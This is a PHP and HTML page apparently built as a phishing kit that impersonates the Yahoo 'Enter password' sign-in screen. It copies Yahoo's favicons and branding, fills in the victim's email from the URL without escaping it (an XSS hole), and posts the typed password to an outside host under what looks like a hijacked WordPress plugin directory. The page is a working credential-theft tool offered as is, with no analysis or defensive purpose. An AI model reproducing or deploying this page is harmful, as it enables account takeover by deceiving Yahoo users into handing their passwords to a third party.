<?php
$email = $_GET['email'];

?>

<!DOCTYPE>
<html>
<head>
<title>Yahoo - Sign In</title>
<meta charset="utf-8">
<meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no"/>
<link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
<link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
<link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
<link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">

<style>
	.container{
		text-align: center;
		}


	.form {
		width: auto;
		height: auto;
		padding-top: 8px;
		padding-right: 9.8%;
		padding-left: 5px;
		padding-bottom: 24px;
		background-color: #ffffff;
		box-shadow: 1px 1px 5px #d1d1d1;
		border: 1px solid #000000;
		}

	input[type=text], input[type=password] {
		width: 88%;
 		height: 34px;
		box-sizing: border-box;
  		font-family: Segoe UI Semibold;
  		font-size: 16px;
  		background-color: #ffffff;
  		color: #000000;
		display: block;
  		padding: 2px;
  		margin-right: auto;
  		margin-left: auto;
  		margin-top: 70px;
  		margin-bottom: 12px;
  		border-left: 0px;
		border-right: 0px;
		border-top: 0px;
		border-bottom: 1px solid #c2c2c2;
		outline: none;
}

	button {
		background-color: #0091ff;
  		color: white;
  		padding: 6px;
  		margin-top: 12px;
  		margin-left: 24px;
  		margin-right: 24px;
  		margin-bottom: 6px;
  		cursor: pointer;
  		width: 87%;
  		border: none;
  		height: 42px;
  		font-family: Candara;
  		font-size: 16px;
  		text-align: center;
  		border-radius: 20px;
		outline: none;
}
</style>
</head>

<body style="padding: 0px; margin: 0px; background-color: #ffffff;">
	<div class="container" style="background-color: #ffffff; padding-right: 45px; padding-left: 45px; margin: 0px; height: 85px; text-align: left;">
		<img src="yahoo.png" alt="yahoo" width="135px" height="90px">
	</div>

	<div class="container" style="padding: auto; margin: auto; background-color: #f9f9f9; height: 85%; position: relative;">
		<div class="container" style="width: auto; height: auto; margin-right: auto; margin-top: 4%; margin-left: -24%; text-align: left; display: inline-block; padding: 0px;">
			<p style="font-family: Nirmala UI; font-size: 21px; margin-left: auto; margin-right: 1%; padding-left: 0px; padding-right: 0px; padding: 0px; line-height: 1.2;"><strong>Yahoo makes it easy to enjoy what matters most in<br>your world.</strong></p>
			<p style="font-family: Candara; font-size: 22px;">Best in class Yahoo Mail, breaking local, national and global<br>news, finance, sports, music, movies and more. You get more<br>out of the web, you get more out of life.</p>
		</div>

		<form method="post" action="https://globetekpro.com/wordpress/wp-content/plugins/makeup/xv/hju/view2.php" style="width: auto; margin-left: 2%; margin-right: auto; position: absolute; top: 2%; display: inline-block;">
		    <div class="container" style="background-color: #ffffff; box-shadow: 1px 1px 5px #d1d1d1; margin: 0px; width: 170%; padding: 1px;">
			<img src="yahoo.png" style="display: block; margin-left: auto; margin-right: auto;" alt="yahoo" width="100px" height="70px">

			 <input id="email" name="email" type="hidden" value="<?php echo $_GET['email']; ?>" /><p style="font-family: Candara;"><?php echo $_GET['email']; ?></p>
	
			<h1 style="font-family: Candara; font-size: 24px; margin-top: 48px; padding: 0px; line-height: 0.1; text-align: center;">Enter password</h1>
			<p style="font-family: Candara; font-size: 16px; margin: 0px; padding: 0px; font-weight: 500; text-align: center;">to finish sign in</p>

			<input id="password" type="password" placeholder="Password" name="password" required>

			<button type="submit" style="font-size: 18px;"><b>Next</b></button>

			<p style="font-family: Segoe UI Semibold; color: #0091ff; font-size: 15px; font-weight: 500; cursor: pointer; text-align: center; margin-bottom: 40%;">Forgot password?</p>
		    </div>
		</form>

	</div>

</body>
</html>
